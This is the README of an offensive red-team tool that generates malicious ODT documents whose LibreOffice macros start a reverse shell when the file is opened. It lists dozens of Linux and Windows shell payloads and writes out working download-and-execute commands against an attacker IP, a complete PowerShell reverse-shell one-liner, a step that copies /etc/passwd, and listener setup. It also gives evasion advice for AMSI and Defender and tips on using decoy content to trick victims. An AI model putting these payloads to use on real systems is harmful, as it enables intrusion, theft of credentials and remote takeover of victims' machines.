# ODT Reverse Shell Generator

**Author: Abdulrahman Mustafa**

Generates malicious ODT (OpenDocument Text) files with embedded LibreOffice Basic macros that execute a reverse shell on document open.

> **For authorized red team / penetration testing engagements only.**

## Install (this tool only)

```bash
git clone --depth 1 --filter=blob:none --sparse https://github.com/3pdoul/RedTeam-Arsenal.git && cd RedTeam-Arsenal && git sparse-checkout set odt-revshell-generator
```

## How It Works

The tool builds a valid ODT file (ZIP archive with ODF XML structure) containing:

- A **LibreOffice Basic macro** (`Standard.Module1.Main`) with the selected reverse shell payload
- A **`dom:load` event binding** that auto-executes the macro when the document is opened

The target must have LibreOffice installed with macro execution enabled (or accept the macro prompt).

## Usage

```
python3 odt-revshell-generator.py <IP> <PORT> [OPTIONS]
python3 odt-revshell-generator.py --list [--os {linux,windows}]
```

### Arguments

| Argument | Description |
|----------|-------------|
| `IP` | Listener IP address for the callback |
| `PORT` | Listener port number (1-65535) |
| `--os` | Target OS: `linux` (default) or `windows` |
| `--payload, -p` | Payload type (see `--list` for all options) |
| `-o, --output` | Output filename (default: `revshell.odt`) |
| `--list, -l` | List all available payloads for the selected OS |
| `--http-port` | Attacker HTTP port for nc download payloads (default: 80) |
| `--cmd` | Custom command to execute instead of a predefined payload |
| `--pre-cmd` | Command(s) to run before the main payload (repeatable) |

### Examples

```bash
# Linux — default bash /dev/tcp
python3 odt-revshell-generator.py 10.10.14.5 4444

# Linux — netcat mkfifo (no -e flag needed)
python3 odt-revshell-generator.py 10.10.14.5 4444 --payload nc-mkfifo

# Linux — download nc from attacker and execute
python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080

# Linux — download nc via curl from attacker
python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-curl --http-port 8000

# Linux — fully custom command
python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd 'curl http://10.10.14.5:8080/shell.sh|bash'

# Linux — run commands before the reverse shell
python3 odt-revshell-generator.py 10.10.14.5 4444 --pre-cmd 'mkdir -p /tmp/.x' --pre-cmd 'id > /tmp/.x/w'

# Windows — default PowerShell (base64-encoded)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows

# Windows — download nc.exe via certutil from attacker
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-certutil --http-port 8080

# Windows — download nc.exe via bitsadmin
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-bitsadmin --http-port 8080

# Windows — download nc.exe via PowerShell WebRequest
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc-download-ps --http-port 8080

# Windows — PowerShell one-liner (no base64, avoids AMSI -e detection)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-oneliner

# Windows — download cradle (short command, payload hosted on attacker)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-cradle --http-port 8080

# Windows — download cradle via Invoke-WebRequest (PowerShell 3.0+)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-iwr

# Windows — custom PowerShell command (inline, no base64)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows --cmd "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/run.ps1')"

# List all payloads
python3 odt-revshell-generator.py --list
python3 odt-revshell-generator.py --list --os windows
```

## Available Payloads

### Linux (22 payloads)

| Payload | Requires | Description |
|---------|----------|-------------|
| `bash-tcp` | bash | Bash /dev/tcp reverse shell |
| `bash-udp` | bash | Bash /dev/udp reverse shell |
| `nc-e` | nc (traditional) | Netcat -e reverse shell |
| `nc-c` | nc (OpenBSD with -c) | Netcat -c reverse shell |
| `nc-mkfifo` | nc, mkfifo | Netcat mkfifo (no -e/-c) |
| `nc-mknod` | nc, mknod | Netcat mknod pipe method |
| `nc-download-wget` | wget | Download nc from attacker via wget, execute |
| `nc-download-curl` | curl | Download nc from attacker via curl, execute |
| `nc-download-fetch` | fetch (FreeBSD) | Download nc from attacker via fetch, execute |
| `ncat` | ncat | Ncat (Nmap) reverse shell |
| `ncat-ssl` | ncat | Ncat with SSL encryption |
| `socat` | socat | Socat interactive PTY shell |
| `python` | python | Python 2 reverse shell |
| `python3` | python3 | Python 3 reverse shell |
| `perl` | perl | Perl reverse shell |
| `php` | php | PHP reverse shell (proc_open) |
| `ruby` | ruby | Ruby reverse shell |
| `node` | node | Node.js reverse shell |
| `telnet` | telnet, mkfifo | Telnet mkfifo reverse shell |
| `openssl` | openssl, mkfifo | OpenSSL encrypted reverse shell |
| `awk` | gawk | AWK /inet reverse shell |
| `lua` | lua, luasocket | Lua (luasocket) reverse shell |

### Windows (15 payloads)

| Payload | Requires | Description |
|---------|----------|-------------|
| `powershell` | powershell | PowerShell TCPClient (base64) |
| `powershell-trycatch` | powershell | PowerShell with error handling |
| `powershell-tls` | powershell | PowerShell TLS encrypted shell |
| `ps-oneliner` | powershell | PowerShell TCPClient inline (no base64) |
| `ps-oneliner-trycatch` | powershell | PowerShell inline with error handling |
| `ps-download-cradle` | powershell, http server | Download cradle (Net.WebClient) |
| `ps-download-iwr` | powershell 3.0+, http server | Download cradle (Invoke-WebRequest) |
| `nc` | nc.exe on target | nc.exe -e cmd.exe |
| `nc-download-certutil` | certutil | Download nc.exe from attacker via certutil, execute |
| `nc-download-ps` | powershell | Download nc.exe from attacker via PowerShell, execute |
| `nc-download-bitsadmin` | bitsadmin | Download nc.exe from attacker via bitsadmin, execute |
| `python` | python, powershell | Python reverse shell via PowerShell |
| `perl` | perl, powershell | Perl reverse shell via PowerShell |
| `ruby` | ruby, powershell | Ruby reverse shell via PowerShell |
| `node` | node, powershell | Node.js reverse shell via PowerShell |

## Download & Execute Workflow

When the target doesn't have netcat installed, use the download payloads to fetch it from your attacker machine:

```bash
# 1. On attacker — host nc binary
#    Copy the correct nc binary for the target arch into a directory
cp /usr/bin/nc ./nc          # Linux target
cp nc.exe ./nc.exe           # Windows target
python3 -m http.server 8080

# 2. Generate the ODT with a download payload
python3 odt-revshell-generator.py 10.10.14.5 4444 -p nc-download-wget --http-port 8080

# 3. Start listener
nc -lvnp 4444

# 4. Deliver the ODT to the target
```

## PowerShell Download Cradle Workflow

For Windows targets where AMSI or Defender blocks inline payloads, use a download cradle to keep the macro command short and serve the actual payload from your HTTP server:

```bash
# 1. On attacker — create a PowerShell reverse shell script
cat > rev.ps1 << 'PS1'
$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
PS1
python3 -m http.server 80

# 2. Generate the ODT with a download cradle
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p ps-download-cradle

# 3. Start listener
nc -lvnp 4444

# 4. Deliver the ODT to the target
```

## Custom Commands

Use `--cmd` to replace the entire payload with any command:

```bash
# Download and execute a script
python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd 'wget http://10.10.14.5/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p'

# Run a custom binary
python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd '/tmp/implant -c2 10.10.14.5:8443'

# Windows — create temp dir, download nc.exe via certutil, reverse shell (all-in-one)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows \
  --cmd "mkdir C:\Windows\Temp\x; certutil -urlcache -f http://10.10.14.5:8080/nc.exe C:\Windows\Temp\x\nc.exe; C:\Windows\Temp\x\nc.exe -e cmd.exe 10.10.14.5 4444"
```

> **Tip:** Host nc.exe on your attacker machine with `python3 -m http.server 8080` before delivering the ODT.

Use `--pre-cmd` to run commands before the main reverse shell (runs synchronously):

```bash
# Stage files before callback
python3 odt-revshell-generator.py 10.10.14.5 4444 \
  --pre-cmd 'mkdir -p /tmp/.cache' \
  --pre-cmd 'cp /etc/passwd /tmp/.cache/' \
  --pre-cmd 'whoami > /tmp/.cache/user'

# Combine pre-commands with any payload
python3 odt-revshell-generator.py 10.10.14.5 4444 -p python3 \
  --pre-cmd 'echo pwned > /tmp/proof.txt'
```

## Catching the Shell

```bash
# Standard listener
nc -lvnp 4444

# SSL listener (for ncat-ssl / powershell-tls)
ncat --ssl -lvnp 4444

# OpenSSL listener (for openssl payload)
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Socat listener (for socat payload — full interactive TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Requirements

- Python 3 (no external dependencies — stdlib only)
- Target must have LibreOffice with macro execution enabled

## OPSEC Notes

- The `meta:generator` tag is set to `LibreOffice` — modify `META_XML` in the script to customize
- Document body is an empty page — add decoy content for social engineering
- Macro is stored in `Basic/Standard/Module1.xml` inside the ODT ZIP
- Linux payloads use `Shell "/bin/bash", 0, "..."` (multi-parameter, hidden window)
- Windows payloads use `Shell("cmd /c ...")` (single-string via cmd.exe) — this is the proven format that works reliably with LibreOffice on Windows
- `powershell*` payloads use base64 `-e` encoding; `ps-*` payloads use inline `-c` to avoid AMSI's base64 decoding hook
- `--cmd` on Windows uses inline `-c` (no base64) for shorter, less detectable macros
- Pre-commands run synchronously via `Shell "cmd.exe", 1, "/c ...", True` to ensure ordering before the main payload

## Disclaimer

This tool is intended for authorized penetration testing, red team operations, and security certification labs (OSCP, CPTS, etc.) only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
